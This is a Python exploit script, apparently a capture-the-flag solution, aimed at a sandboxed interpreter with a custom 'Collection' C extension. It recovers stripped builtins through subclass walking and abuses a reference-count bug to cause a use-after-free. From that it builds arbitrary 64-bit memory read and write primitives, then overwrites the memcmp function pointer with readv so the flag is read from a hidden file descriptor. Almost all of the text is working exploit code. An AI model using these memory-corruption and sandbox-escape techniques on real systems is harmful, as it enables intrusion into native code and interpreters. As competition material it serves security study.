'''
# For local testing
import os
f = open('flag')
os.dup2(f.fileno(), 1023)

from sys import modules
import Collection
del modules['os']
keys = list(__builtins__.__dict__.keys())
for k in keys:
    if k != 'id' and k != 'hex' and k != 'print' and k != 'range':
        del __builtins__.__dict__[k]
'''

bytes = [i for i in {}.__class__.__base__.__subclasses__()
         if i.__name__ == 'bytes'][0]
bytearray = [i for i in {}.__class__.__base__.__subclasses__()
             if i.__name__ == 'bytearray'][0]
a = Collection.Collection({"a": [bytes(128), bytes(128)]})
l = a.get('a')
a.get('a')
# now refcount of l == 0
target_obj = l[1]


b1 = bytearray(128 + 8*4)
b2 = bytearray(128 + 8*4)
# now id(b2.buffer) equal to id(target_obj)


def set_bytearray_header():
    b2[0] = 1  # refcount
    b2[8] = 0xe0  # pytype structure pointer
    b2[9] = 0xe7
    b2[10] = 0x9c
    b2[16] = 64  # size
    b2[24] = 65  # size


def set_bytearray_addr(addr):
    for i in range(8):
        b2[32 + i] = (addr >> (i*8)) & 0xff
        b2[40 + i] = (addr >> (i*8)) & 0xff


def read64(addr):
    set_bytearray_addr(addr)
    ret = 0
    for i in range(8):
        ret |= (target_obj[i] << (i*8))
    return ret


def write64(addr, val):
    set_bytearray_addr(addr)
    for i in range(8):
        target_obj[i] = (val >> (i*8)) & 0xff


set_bytearray_header()

readv = read64(0x9B3D80)
memcmp = read64(0x9B3AE8)

buf = bytearray(512)
buf_ptr = read64(id(buf) + 32)

y = bytearray(b'1' * 1)
y_buf = read64(id(y) + 40)
write64(id(y) + 40, 1023)  # rdi

x = bytearray(b'0' * 1)
x_buf = read64(id(x) + 40)
write64(id(x) + 40, buf_ptr)  # rsi

# rdx = min(sizeof(y_buf), sizeof(x_buf)) = 1

# prepare iovec struct
write64(buf_ptr, buf_ptr + 16)  # void  *iov_base
write64(buf_ptr + 8, 0x100)  # size_t iov_len

write64(0x9B3AE8, readv)  # replace memcmp to readv
# trigger readv(1023, buf_ptr, 1)
y > x

# restore all pointers
write64(0x9B3AE8, memcmp)
write64(id(y) + 40, y_buf)
write64(id(x) + 40, x_buf)

print(buf)

while True:
    pass
END_OF_PWN
